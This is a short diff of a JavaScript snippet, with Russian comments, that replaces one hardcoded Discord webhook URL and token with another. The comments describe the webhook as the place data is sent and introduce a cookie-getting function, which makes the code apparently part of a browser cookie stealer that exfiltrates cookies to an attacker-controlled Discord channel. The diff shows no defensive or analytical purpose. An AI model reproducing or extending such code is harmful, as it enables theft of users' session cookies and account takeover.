@@ -1,7 +1,7 @@
 setTimeout(() => {
 (async function() {
     // Вебхук для отправки данных. Вставлен напрямую для демонстрации.
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1464694278067323257/Wg3pc39WVUEleGA5wZ9WR4shVNNIeOOvw0gHO0Hbrq_o9o0dIgshE3kBqDq3T9Gr5bYY';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466531703853027331/7gYLBFV7XV0J9_68NVLTCeQTtFXlk8tZ-Cn-00jGA5ITt8KvdPtL-5jnf4VJBfX7r7lo';
 
     // Функция для получения куки
     const getCookie = (name) => {
